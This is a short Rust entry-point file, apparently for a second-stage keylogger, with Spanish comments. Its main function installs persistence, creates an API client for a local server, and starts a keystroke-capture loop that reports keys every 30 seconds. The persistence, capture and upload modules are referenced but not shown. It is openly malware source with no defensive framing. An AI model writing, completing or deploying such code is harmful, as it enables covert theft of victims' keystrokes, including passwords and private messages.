mod keylogger;
mod api;
mod persistence;

use api::ApiClient;
use std::sync::Arc;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("🔐 Stage 2 - Keylogger iniciado");

    // Instalar persistencia
    let _ = persistence::install();

    // Crear cliente API con envío periódico
    let api_client = Arc::new(ApiClient::new("http://localhost:8080"));

    println!("⌨️  Keylogger activo - presiona teclas");
    println!("📤 Envío cada {} segundos", 30); // Coincide con SEND_INTERVAL_SECONDS

    // Iniciar keylogger (bloquea el hilo principal)
    keylogger::start(api_client)?;

    Ok(())
}
